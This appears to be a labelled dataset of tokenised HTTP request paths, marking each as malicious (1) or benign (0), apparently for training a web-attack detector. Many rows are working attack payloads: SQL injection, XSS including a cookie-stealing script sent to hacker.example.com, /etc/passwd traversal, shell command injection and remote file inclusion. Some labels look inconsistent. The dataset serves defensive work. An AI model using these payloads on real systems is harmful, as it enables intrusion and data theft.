request	label
"/ 606wkcop . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ goa ' uld / 	1
"/ main . php ? stuff =  ""  & del q89179194 & rem "	1
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tmpvms )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / strings / parameters = 1 '  +  ( select  ' ayod '  where 7839 = 7839 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  )  +  ' 	1
"/ string / strings / parameters = 1 ""  ""  ; select  ( case when  ( 8618 = 8706 )  then 8618 else 8618 *  ( select 8618 from mysql . db )  end )  # "	1
/ homeimagearea / 	0
/ examples / jsp / cal / file . php ? path =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  # 	1
/  .  .  .  .  /  /  .  .  .  .  /  / web-inf / web . xml 	1
"/ string / strings / parameters = 1 ""  ""  )  where 9062 = 9062 ; select  ( case when  ( 8916 = 1357 )  then 8916 else 8916 *  ( select 8916 from information_schema . character_sets )  end )  # "	1
/ 522_ss / 	0
/ pbserver /  .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
"/ string / strings / parameters = & lt ; script a =  `  & gt ;  `  src =  \  "" http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / xss &  # 46 ; js \  ""  & gt ;  & lt ;  / script & gt ; "	1
/ config . php ? rel_path = xxpathxx ? 	1
/ 32183034 / 	0
/ intl_sites / 	0
/ string / modo = insertar & precio = 6194 & b1 = pasar + por + caja 	0
/ modules . php ? name = news & op = rate_complete & sid = 1 '  and 1 = 0 union /  *  *  /  select  ' sqlinjection_test & score = 5 	1
/  /  .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c / etc / passwd 	1
/ string / strings / parameters = 1 '  )  where 2775 = 2775 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  -- 	1
/ airs and graces / 	0
/ 3943833 / 	0
/ javascript / promotion . xsl 	0
/ string / strings / parameters = bylina 	0
/ 165611 / 	0
/ string / strings / parameters = grifeo @ lalectura . af 	0
/ examples / jsp / checkbox / profil . php ? id = 1  < script > foo <  / script > 	1
/ discreetblacktn / 	0
/ string / strings / parameters = 1 )  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  ( 8738 = 8738 	1
/ string / strings / parameters = -6586 '  )  )  or 2021 = 2996 	1
/ dinosaurplanet / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- "	1
/ wavemaker_2 / 	0
/ index . php ? promod = xxpathxx ? cmd 	1
/ string / strings / parameters = or  ' something '   =   ' some '  +  ' thing ' 	1
/ string / strings / parameters = -9937 '  )  )  union all select 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 # 	1
/ anno-1503 / 	0
/ modperl-rss0 / 	0
/ salaris / 	0
/ examples / jsp / cal / core / editor . php ? editor_insert_bottom =  / etc / passwd 	1
/ javascript / 1997 . cc 	0
/ string / strings / parameters = '  echo wiruwf $  (  ( 87 + 88 )  )  $  ( echo wiruwf ) wiruwf /  / 	1
/ string / strings / parameters = 25645562x 	0
/ racequiz / 	0
/ googlesketchup / 	0
/ string / strings / parameters = 1 )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ string / strings / parameters = 84638109h 	0
"/ p043snfr . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ whofarted / 	0
/ string / strings / parameters = champn 	0
/ demoapplications / 	0
/ string / strings / parameters = justis8 	0
/ string / strings / parameters = 1 '  )  as tsge where 6970 = 6970 ; select count (  *  )  from generate_series ( 1 , 5000000 )  -- 	1
/ icons_calendar / 	0
"/ string / strings / parameters = ""  & echo trmptd $  (  ( 48 + 23 )  )  $  ( echo trmptd ) trmptd \ "	1
/ string / strings / parameters = 1 '  )  )  )  ; select sleep ( 5 )  and  (  (  (  ' qjsc '  =  ' qjsc 	1
/ string / modo = registro & login = yie-tarn & password = ordinar & nombre = edel & apellidos = vogin & email = costello_browallius @ autoconstruccion . bt & dni = 07375030b & direccion = c /  + bascuana + 52 ,  + 5-e & ciudad = puebla + de + obando & cp = 01226 & provincia = castelln & ntc = 5068023807822442 & b1 = registrar 	0
/ javascript / pipermail . php 	0
/ string / strings / parameters = 20 	0
/ 20030430-teacheroftheyear / 	0
"/ xfkun1ku . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / text . exe 	1
/ all japan pro wrestling / 	0
"/ string / strings / parameters = 1 %  ""  ""  ; if ( 8995 = 9787 )  select 8995 else drop function ofgg -- "	1
/ examples / jsp / jsp2 / el / index . php ? search =  < script > foo <  / script > 	1
/ dental_health / 	0
/ macc lads - come to brum / 	0
"/ main . php ? logout =  ""  & rm \ x0bq41987339 & rem \ x0b "	1
"/ main . php ? logout =  ""  & ver ;  > q32916572 & rem ; "	1
/ javascript / oa . exe 	1
/ examples / jsp / sessions / pjreview_neo . cgi ? p =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = | usr / bin / id 	1
/ string / strings / parameters = 5874582536939538 	0
/ home-whatsnew / 	0
/ string / strings / parameters = georgian 	0
/ string / strings / parameters = ponsati puratic 	0
/ string / strings / parameters = -2351 )  )  as xdqn where 4019 = 4019 or 8571 = 8571 -- 	1
/ equipmentshorta / 	0
/ tempestcsi / 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testxllt = 9940 ""  > "	1
/ javascript / ns . jsf 	0
/ sunset / 	0
/ string / strings / parameters = bjerg @ hangartalleres . er 	0
/ webcgi / webcart / webcart . cgi ? change = yes & code = phold & config = mountain & nextpage =  ; cat  / etc / passwd | 	1
/ string / id = 3 & nombre = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & precio = 85 & cantidad = 32 & b1 = aadir + al + carrito 	1
/ string / modo = registro & login = mariabel & password = c2645ido & nombre = zelma & apellidos = dotor + fornell & email = celik-regan @ turinga . sb & dni = 95113653m & direccion = carrer + jaume + d ' artes + 78 ,  +  & ciudad = osornillo & cp = 10411 & provincia = burgos & ntc = 3090147546194865 & b1 = registrar 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo wsmvbw )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / strings / parameters = 19 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo tnsrys  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ javascript / thread . cnf 	0
/ string / strings / parameters = 34196882e 	0
/ 179717 / 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qhsduy )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ administrator / components / com_clickheat / install . clickheat . php ? globals [ mosconfig_absolute_path ]  = xxpathxx 	1
"/ string / strings / parameters = 1 ""  ""  )  where 2702 = 2702 and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  -- "	1
"/ ao22ww7y . cfm ?  < meta http-equiv = set-cookie content =  "" testqppc = 8767 ""  > "	1
/ string / strings / parameters = contrariosa 	0
/ string / modo = insertar & precio = 5856 & b1 = pasar + por + caja 	0
/ string / modo = registro & login = tsolas & passworda = c3763ativa . m4n3e & nombre = frida & apellidos = llagostera + llaveria & email = cockneys @ drae2 . tl & dni = 11939364h & direccion = calle + alava + 17 + 12 ? c & ciudad = sada & cp = 25139 & provincia = zaragoza & ntc = 3664449984112984 & b1 = registrar 	1
/ string / strings / parameters = < iframe src = http :  /  / www . vulnerability-lab . com > 	1
/ scripts / fake . cgi ? arg =  / dir /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini 	1
/ string / strings / parameters = ; echo $ ifscidnhm $  (  ( 30 + 88 )  )  $  ( echo $ ifscidnhm ) cidnhm 	1
/ 0439887453_65x90 / 	0
/ labview_v2 / 	0
/ javascript /  ~ amanda . dat 	0
/ fozzy - all that remains 2005 / 	0
/ javascript / votes . asmx 	0
"/ main . php ? stuff =  "" del ; q74579968 & rem ; "	1
/ string / modo = insertar & precio = 2876 & b1 = confirmar 	0
/ string / modo = registro & login = tsern & password = s87aboc9do4 & nombre = nadir & apellidos = ganci + zanuy & email = wolfstone @ g-audio . a @ ero & dni = 01364603j & direccion = carrer + sant + antoni ,  + s / n +  & ciudad = torre + del + bierzo & cp = 33780 & provincia = ourense & ntc = 6172384858877900 & b1 = registrar 	1
"/ help . php ? q =  ""  \ x0drm \ x09q93881688 \ x09 # "	1
/ phpmyadmin / nslookup . cgi ? query = localhost ; id & type = any & ns = 	1
/ examples / jsp / colors / popup . php ? include_path =  / etc / passwd \ x00 	1
/ javascript / sources . exe 	1
/ string / strings / parameters = 3192907631401763 	0
/ q65557117 	0
/  *  *  / or /  *  *  / 1 /  *  *  /  =  /  *  *  / 1 	1
/ 171231 / 	0
/ new20060912 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tpcdnb )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
"/ a0imiuf1 . aspx ?  < script > document . cookie =  "" testxqrn = 4654 ;  ""  <  / script > "	1
/ examples / jsp / colors / feedsplitter . php ? format =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & debug = 1 	1
/ string / strings / parameters = morandy bosquet 	0
/ string / strings / parameters = sabadell 	0
/ string / strings / parameters = ;  str =  $  ( echo sdkegm )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ scripts / index . php ? go = detail & id = -99999 /  *  *  / union /  *  *  / select /  *  *  / 0 , 1 , concat ( 1332009306 , 0x3a , 1514709258 )  , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 	1
/ cgi-exe / r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = -4373 %  ""  ""  )  )  or 5672 = 5188 -- "	1
/ wired-cd / 	0
/ raspy-1_small / 	0
"/ string / strings / parameters = & lt ; a href =  "" http :  /  / i . imgur . com / b7sajuk . jpg ""  download & gt ;  < a href =  "" http :  /  / i . imgur . com / b7sajuk . jpg ""  download > what a cute kitty !  <  / a >  & lt ;  / a & gt ; "	1
"/ string / strings / parameters = < script > x =  ""  ""  % prompt ( 9 )  %  ""  ""  ; y = 42 ;  <  / script > "	1
/ floridakeys / 	0
/ script / ident / loginmodif . php ? path_inc = xxpathxx 	1
"/ zv8tv7h8 . aspx ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  ' chmod + 555 +  / tmp / tmcrsoeqnm0 ;  '  )  ;  function v 	1
/ string / modo = entrar & login = adrie & pwd = nervino & remember = on & b1 = entrar 	0
"/ help . php ? q =  ""  \ x0dsleep 11  # "	1
/ javascript / webchat . test 	0
/ pear_remoteinstaller / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo matzok )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ 1104418 / 	0
/ summerjobsincanada / 	0
/ string / strings / parameters = 04681808c 	0
/  .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 { file } 	1
/ string / strings / parameters = -6890 '  )  )  or 5771 = 7721 -- 	1
/ string / strings / parameters = majagua 	0
/ string / strings / parameters = empeltre 	0
/ 20020412-7 / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ javascript / compress . pl 	0
/ pppoe-project / 	0
/ rnsignup / 	0
/ friend of mine / 	0
/ examples / jsp / sessions / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ javascript / jrun . csv 	0
/ 121021 / 	0
/ string / strings / parameters = !  [ a ]  ( javascript : prompt ( document . cookie )  )  \ 	1
/ string / modo = registro & login = ehrenfri & password = 4l6ad1e14 & nombre = ailn & apellidos = amaro & email = antone1 @ tiendasyofertas . ve & dni = 97233442e & direccion = c /  + artazuria ,  + 43 + 10 ? e & ciudad = talarrubias & cp = 03400 & provincia = granada & ntc = 8954375699794509 & b1 = registrar 	0
"/ string / strings / parameters = 1 ""  ""  )  union all select null , null -- "	1
/ dabbler_v2 / 	0
"/ hjdzm96v . php ?  < meta http-equiv = set-cookie content =  "" testbyqe = 7474 ""  > "	1
"/ main . php ? logout =  ""  \ x0drm q33212666  # "	1
/ admin / news . admin . php ? path_to_script = http :  /  / cirt . net / rfiinc . txt ?  ?  & cmd = ls 	1
/ string / strings / parameters = maclaren 	0
/ javascript / https . exe 	1
/ dgawlitta05 / 	0
"/ main . php ? logout =  ""  | ping ; -w ; 7000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; "	1
/ popconf / 	0
/ 16315363 / 	0
/ string / strings / parameters = &  & echo pilbfc $  (  ( 9 + 73 )  )  $  ( echo pilbfc ) pilbfc /  / 	1
/ logo_dws / 	0
/ cfide / scripts / ajax / fckeditor / editor / filemanager / connectors / cfm / upload . cfm ? command = fileupload & type = file & currentfolder =  / jibrf . jsp \ x00 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fwehdm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ string / strings / parameters = '  & echo $ ifsvdfjnu $  (  ( 23 + 92 )  )  $  ( echo $ ifsvdfjnu ) vdfjnu ' 	1
/ series9 / 	0
/ javascript / util . as 	0
/ logo_bankrate / 	0
/ string / strings / parameters = 1 )  )  as uqsi where 1644 = 1644 and 9198 = 9198 -- 	1
/ wireless / 	0
/ examples / servlets / servlet / classes / adodbt / sql . php ? classes_dir =  / etc / passwd \ x00 	1
/ string / strings / parameters = ;  str =  $  ( echo wszrir )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / modo = insertar & precio = 6703 & b1 = confirmar 	0
/ string / strings / parameters = calle crehuet ,  63 4-h 	0
/ en-us / account / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor 	1
/ string / strings / parameters = as injectx where 1 = 1 and 1 = 1 	1
/ feat_altix / 	0
/ scripts / pnrwmkim . exe 	1
/ string / modo = entrar & login = milly7 & pwd = 4ip7237o8h2dira & remember = off & b1 = entrar 	0
/ scripts / lom_update . php ? etcdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ bravesentry03994_thumb / 	0
/ string / strings / parameters = 1 %  '  )  )  )  or elt ( 6272 = 6272 , sleep ( 5 )  )  and  (  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = plza .  padre juan de mariana 152 	0
/ main . php ? logout = rm ; q78779487 & rem ; 	1
/ world_small / 	0
/ string / strings / parameters = '  echo uxktuc $  (  ( 59 + 25 )  )  $  ( echo uxktuc ) uxktuc \  \ 	1
/ 111709 / 	0
"/ string / strings / parameters = ""  echo tzznsl $  (  ( 92 + 66 )  )  $  ( echo tzznsl ) tzznsl \ "	1
/ rdf . php ? page [ path ]  = xxpathxx ?  & cmd = ls 	1
/ ringtones-20 / 	0
/ string / strings / parameters = ca61u13ia-0 	0
/ javascript / showmap . exe 	1
/ examples / jsp / jsp2 / el / include / monitoring / engine / makexml . php ? fileoreonconf =  / etc / passwd \ x00 	1
/ javascript / vfs . swf 	0
/ examples / servlets / servlet / auktion . cgi ? menue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ javascript / balance . exe 	1
/ 6o00o15h5u / 	0
/ pet_products / 	0
/ cgi-sys / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = < script src =  %  ( jscript ) s ?  < b > 	1
/ string / strings / parameters = 1 where 7442 = 7442 ; begin user_lock . sleep ( 5 )  ;  end -- 	1
/ string / strings / parameters = plaa verdum 14 	0
/ scripts / news . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	1
/ pep-352 / 	0
/ relea00258 / 	0
/ diana_gifts / 	0
/ string / strings / parameters = domingo 	0
/ 120984 / 	0
/ javascript / 7z . ppt 	0
/ string / strings / parameters = '  &  & echo miqkpq $  (  ( 80 + 18 )  )  $  ( echo miqkpq ) miqkpq | 	1
/ module / forum / forum . php ? fd = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  =  '  ; 	1
"/ string / strings / parameters = < script > document . cookie =  "" testswjp = 6010 ;  ""  <  / script > "	1
/ string / strings / parameters = -8463 )  )  )  or 4861 = 9834 # 	1
/ string / strings / parameters = 1 '  union select 1 , 2 , 3 -- 	1
/ 182508 / 	0
/ sexinfoto / 	0
/ javascript / features . csv 	0
/ string / strings / parameters = < script > var x  =  “a�? ;  confirm ( 1 )  ;  /  / �? ;  <  / script > 	1
"/ string / strings / parameters = ""  ; echo gsrlst $  (  ( 57 + 23 )  )  $  ( echo gsrlst ) gsrlst "	1
/ wetzlar / 	0
/ search . php ? id =  @ rfiurl 	0
/ cipscene_arch / 	0
/ panda2 / 	0
/ functions . php ? include_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	0
/ javascript / daily . tpl 	0
/ string / modo = registro & login = hamlett & password = elstica & nombre = ladi & apellidos = kawas + kercooff & email = keca @ autoconstruccion . cu & dni = 75582707s & direccion = calle + robert + gerhard ,  + s / n + 6c & ciudad = cstaras & cp = 42120 & provincia = burgos & ntc = 9054650550547446 & b1 = registrar 	0
/ string / strings / parameters = 1 '  +  ( select eluw where 6210 = 6210 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ navbararrow / 	0
/ blog-headshot_yoursay / 	0
/ string / strings / parameters = -2981 )  )  or  ( 8459 = 8459 )  * 4906 and  (  ( 4202 = 4202 	1
/ string / modo = registro & login = doraine & password = cardenala & nombre =  ,  ' eustaq ' uio & apellidos = ejea + amunategui & email = jessye @ lodgemadrid . bb & dni = 46022704a & direccion = c /  + san + gregorio + 197 + 5 ? b & ciudad = tarragona & cp = 25721 & provincia = pontevedra & ntc = 8009869624920768 & b1 = registrar 	1
/ string / strings / parameters = 0269447503610316 	0
/ string / strings / parameters = lawlik @ housemovie . lk 	0
/ examples / jsp / colors / index . php ? id =  ' 	1
/ string / strings / parameters = 1 %  '  )  )  )  union all select null , null , null , null , null , null , null , null , null # 	1
/ string / modo = registroany set-cookie :  + tamper = 1041264011025374727 & login = carvalho & password = de42ae0 & nombre = saddam & apellidos = ponsat + lemunao & email = bascomb @ elpaisaje . pro & dni = 31723380d & direccion = barri + sant + julia + 120 ,  + 13 ? a & ciudad = palencia + de + negrilla & cp = 50155 & provincia = almera & ntc = 1165920681066048 & b1 = registrar 	1
/ vampwillow / 	0
/ string / strings / parameters = | echo ostcog $  (  ( 49 + 82 )  )  $  ( echo ostcog ) ostcog 	1
/ string / strings / parameters = 6374 	0
/ cgi-bin / pollit / poll_it_ssi_v2 . 0 . cgi ? data_dir =  / etc / passwd \ x00 	1
/ string / strings / parameters = cualquiera 	0
/ string / strings / parameters = vila 	0
/ examples / jsp / jsp2 / jspx / admin / top . php ? admindir =  / etc / passwd \ x00 	1
/ javascript / monitors . tar 	0
/ et050304 / 	0
/ 05apoc / 	0
/ javascript / mambo . exe 	1
/ string / strings / parameters = 1 '  )  )  )  and char ( 109 )  |  | char ( 79 )  |  | char ( 70 )  |  | char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ drug-ultram / 	0
"/ search . jsp ? q =  %  ""  < script > alert ( 1332008323 )  <  / script > "	1
"/ main . php ? logout =  "" del , q64292722 & rem , "	1
/ webcalendar / week . php ? eventinfo =  < script > alert ( document . cookie )  <  / script > 	1
/ string / strings / parameters = 7m63e31r 	0
/ string / modo = insertar & precio = 8855 & b1 = pasar + por + caja 	0
/ login_trustedcare / 	0
/ string / strings / parameters = 5563798964634481 	0
/ 000028231 / 	0
/ filmen_medium / 	0
/ offshore1655 / 	0
/ string / strings / parameters = 1 '  )  )  )  rlike sleep ( 5 )  and  (  (  (  ' zwyx '  =  ' zwyx 	1
/ 102899 / 	0
/ scripts / kb . cgi ? view =  '  & lang = en 	1
/ javascript / 08 . gif 	0
/ string / strings / parameters = 6435 	0
/ javascript / credits . as 	0
/ 1999scr3_0668 / 	0
/ javascript / baz . vbs 	0
/ vwmg565s . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = gallegos angeleri 	0
/ emonitor / 	0
/ string / strings / parameters = 1pergamin0da 	0
"/ en-us / odzk29aa . htm ?  < script > document . cookie =  "" testtfvh = 2141 ;  ""  <  / script > "	1
/ javascript / www2 . cnf 	0
/ string / modo = insertar & precio = 9362 & b1 = pasar + por + caja 	0
/ topicapportables / 	0
/ dave34011263575 / 	0
/ string / strings / parameters = ; echo $ ifsjjrdly $  (  ( 50 + 38 )  )  $  ( echo $ ifsjjrdly ) jjrdly | 	1
/ virtualkeyboards / 	0
/ string / strings / parameters = legarda 	0
/ article_1498 / 	0
/ string / strings / parameters = calle sanchez guerrero ,  63 ,  10 ? h 	0
/ rock_229 / 	0
/ w32rbotasj / 	0
/ string / modo = registro & login = eansor & password = decuplar & nombre = dalmacio & apellidos = zurueta + olarte & email = meed @ peliculasen3d . va & dni = 00033926r & direccion = nicaragua ,  + 195 ,  +  & ciudad = gldar & cp = 19275 & provincia = la + rioja & ntc = 3891386369836978 & b1 = registrar 	0
/ ns7203827694 / 	0
"/ string / strings / parameters = -7235 ""  ""  )  union all select 4624 , 4624 , 4624 , 4624 , 4624 , 4624 , 4624 , 4624 , 4624 , 4624 # "	1
/ string / strings / parameters = vacher 	0
/ laska_05 / 	0
/ allsoftware-a / 	0
/ sploits_aix / 	0
"/ string / strings / parameters = ""   str =  $  ( echo rspyhg )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ string / modo = registro & login = alvean & password = 9o52cardea7 & nombre = itter & apellidos = fredes + damas & email = benito @ mayoriasilenciosa . mu & dni = 16574331w & direccion = calle + juan + de + sevilla + 102 + 3c & ciudad = cabanabona & cp = 33001 & provincia = jan & ntc = 5515498437464021 & b1 = registrar 	0
/ javascript / int . gz 	0
/ kong ' s / 	1
/ string / strings / parameters = germain @ elcorteitaliano . cat 	0
/ string / strings / parameters = 1 '  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  ' udvq '  =  ' udvq 	1
"/ 9ko6m4c8 . jsp ?  < meta http-equiv = set-cookie content =  "" testylik = 3403 ""  > "	1
/ 122158 / 	0
/ string / modo = entrar & login = fournier & pwd = 2isnomo & remember = off & b1 = entrar 	0
"/ ybz5rz7a . htm ?  < script > document . cookie =  "" testsbvw = 6289 ;  ""  <  / script > "	1
"/ string / strings / parameters = 1 ""  ""  and make_set ( 8403 = 8403 , 8899 )  and  ""  "" fqxr ""  ""  like  ""  "" fqxr "	1
"/  ?  < meta http-equiv = set-cookie content =  "" testbfpq = 3326 ""  > "	1
/ 2395299 / 	0
/ javascript / es . mdb 	0
/ string / strings / parameters = calle tras do colexio s / n 	0
/ string / strings / parameters = aseguir 	0
/ string / strings / parameters = priaranza del bierzo 	0
/ javascript / remote . exe 	1
/ javascript / macromedia . exe 	1
"/ string / strings / parameters = < style > body { -moz-binding : url (  "" http :  /  / xss . rocks / xssmoz . xml # xss ""  )  }  <  / style > "	1
/ string / modo = registro & login = chaurett & password = mon3g69l5o & nombre = serapia & apellidos = nobrega + medianero & email = metclafe4 @ cursosdele . az & dni = 65927228m & direccion = bomba ,  + 130 +  & ciudad = granera & cp = 09491 & provincia = asturias & ntc = 5850065450464503 & b1 = registrar 	0
/ javascript / junk . out 	0
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904220 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
"/ string / strings / parameters = -9928 ""  ""  )  )  union all select 7511 , 7511 , 7511 , 7511 , 7511 , 7511 , 7511 , 7511 # "	1
/ codebreaker / 	0
/ string / strings / parameters = declamatoria 	0
/ string / strings / parameters = 6068872353637428 	0
/ script / ident / loginmodif . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ examples / jsp / checkbox / config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file } 	1
/ string / strings / parameters = <  / script >  < script > confirm ( 3 )  <  / script > 	1
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo wvupxi )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ scripts / webc . cgi / 	1
"/ main . php ? logout =  ""  & del q63418787 & rem "	1
/ string / strings / parameters = '  & echo pafsck $  (  ( 22 + 53 )  )  $  ( echo pafsck ) pafsck & 	1
/ microsoft visio viewer 2002_information / 	0
/ string / strings / parameters = pl .  santiago apostol 79 10-f 	0
/ string / strings / parameters = prussel @ mataluenga . co 	0
/ circelit / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo rorkmj )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
